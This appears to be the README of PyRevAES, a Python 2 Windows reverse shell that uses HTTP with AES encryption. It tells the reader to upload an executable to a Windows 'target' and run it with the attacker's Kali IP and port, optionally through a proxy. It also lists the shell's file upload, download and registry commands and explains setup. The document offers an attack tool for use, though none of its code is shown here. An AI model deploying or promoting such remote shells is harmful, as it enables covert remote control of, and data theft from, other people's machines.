<h1 align="center">
	<img width="400" src="pyrevaes.png" alt="PyRevAES">
</h1>

# PyRevAES

A Windows Reverse Shell using HTTP methods with 256-bit AES encryption written in python version 2

If I get some time (and encouragement), I will convert this to a python3 project and probably use some oop.

## Usage:
1. Run server_shell_http.py from kali
2. Upload client_shell_http.exe to Windows target
3. Run the following command on the target for a reverse shell without proxy:
```
C:\client_shell_http.exe <kali_ip> 80
```
4. Run the following command for a reverse shell with proxy:
```
C:\client_shell_http.exe <kali_ip> <kali_port> <proxy_address> <Proxy_port>
```

## EXTRAS:
```client_shell_http.py``` - If you want to create your own executable or run directly from python,  code is available.

```TCP_proxy_online.py``` - TCP proxy from ```https://stackoverflow.com/questions/32468270/tcp-proxy-using-python``` Purely the work of voorloop. You might need to modfy lines 16 and 94 for the forwarded reverseshell/port and the proxy port, respectively.

```get-pip.py``` To install pip for python2 (after deprecation). Reference: https://bootstrap.pypa.io/

## COMMANDS:
```upload [filename]```

```download [filename]```     => Need to rename file after download.

```winreg```                 => displays help message


## Install
1. git clone <repo>
2. ```pip2 install -r requirements.txt```
3. ```python2 server_shell_http.py```
4. choose port ```80``` - Other ports may work, but it works best with port ```80```

## Issues
If there are issues with pip2 installation (due to deprecation) refer to this to get pip for python2 working again. ```https://bootstrap.pypa.io/```
If there are issues with pycrypto, install the following:
```sudo apt install build-essential libssl-dev libffi-dev python-dev```
If still having issues, try running everything using sudo.


## Notes:
- Logo made with courtesy of https://www.freelogodesign.org/
- Most of this code is from here ```https://www.trustedsec.com/2012/03/building-a-native-http-shell-with-aes-in-python/``` and about twenty other different sources.  I apologise if I haven't referenced anyone's code here.
